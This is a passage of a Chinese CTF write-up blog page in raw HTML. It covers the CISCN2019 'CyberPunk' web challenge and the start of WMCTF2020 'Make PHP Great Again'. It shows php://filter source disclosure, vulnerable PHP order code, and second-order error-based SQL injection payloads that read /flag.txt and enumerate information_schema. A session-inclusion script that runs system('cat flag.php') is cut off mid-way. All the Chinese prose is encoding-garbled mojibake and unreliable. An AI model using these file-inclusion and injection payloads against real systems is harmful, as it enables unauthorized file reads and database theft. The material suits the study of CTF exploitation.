</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">=</span><span class="n">res</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web5cyberpunk">[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk
</h2><p>åœ¨æºç æœ€ä¸‹é¢æœ‰æ³¨é‡Š</p>
<p>æœ‰ä¸ªfileå‚æ•°å¯ä»¥è¯»æ–‡ä»¶</p>
<p>ä¼ªåè®®è¯»æ‰€æœ‰å‰é¢çš„php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// $file = $_GET[&#34;file&#34;];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/phar|zip|bzip2|zlib|data|input|%00/i&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;no way!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$fetch</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;&lt;p&gt;å§“å:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&lt;p&gt;, åœ°å€:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;æœªæ‰¾åˆ°è®¢å•!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;ä¿¡æ¯ä¸å…¨&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//var_dump($_POST);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$address</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$user_name</span><span class="o">.</span><span class="s2">&#34;å·²æäº¤è®¢å•&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;sss&#34;</span><span class="p">,</span> <span class="nv">$user_name</span><span class="p">,</span> <span class="nv">$address</span><span class="p">,</span> <span class="nv">$phone</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">=</span> <span class="nv">$re</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;è®¢å•æäº¤æˆåŠŸ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;ä¿¡æ¯ä¸å…¨&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$address</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$fetch</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update `user` set `address`=&#39;&#34;</span><span class="o">.</span><span class="nv">$address</span><span class="o">.</span><span class="s2">&#34;&#39;, `old_address`=&#39;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39; where `user_id`=&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸€çœ¼äºŒæ¬¡æ³¨å…¥,è¿™é‡Œå¯ä»¥åœ¨åœ°å€çš„åœ°æ–¹æ³¨å…¥</p>
<p>ç›´æ¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),1,30))),1)#</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),30,60))),1)#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…æ„é€ <code>user_id</code>çš„å½¢å¼æ¥æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="s1">&#39;),1,30)),0x7e),1)#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå¯ä»¥è¿™æ ·è®©ä»–æŠ¥é”™</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,`user_id`=database()#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,`user_id`=(select(group_concat(schema_name))from(information_schema.schemata))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;</span><span class="n">ctftraining</span><span class="s1">&#39;))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;</span><span class="n">FLAG_TABLE</span><span class="s1">&#39;))#
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;,`user_id`=(select FLAG_COLUMN from ctftraining.FLAG_TABLE limit
</span></span></span><span class="line"><span class="cl"><span class="s1">0,1)#
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡ŒæŸ¥å‡ºæ¥ç©ºçš„ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸Šé¢çš„åŠæ³•</p>
<h2 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again
</h2><p>è¿™é¢˜ç”¨sessionåŒ…å«å¯ä»¥è§£å†³æ˜¯éé¢„æœŸ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;bbbbbbb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span><span class="s2">&#34;system(&#39;cat flag.php&#39;);&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
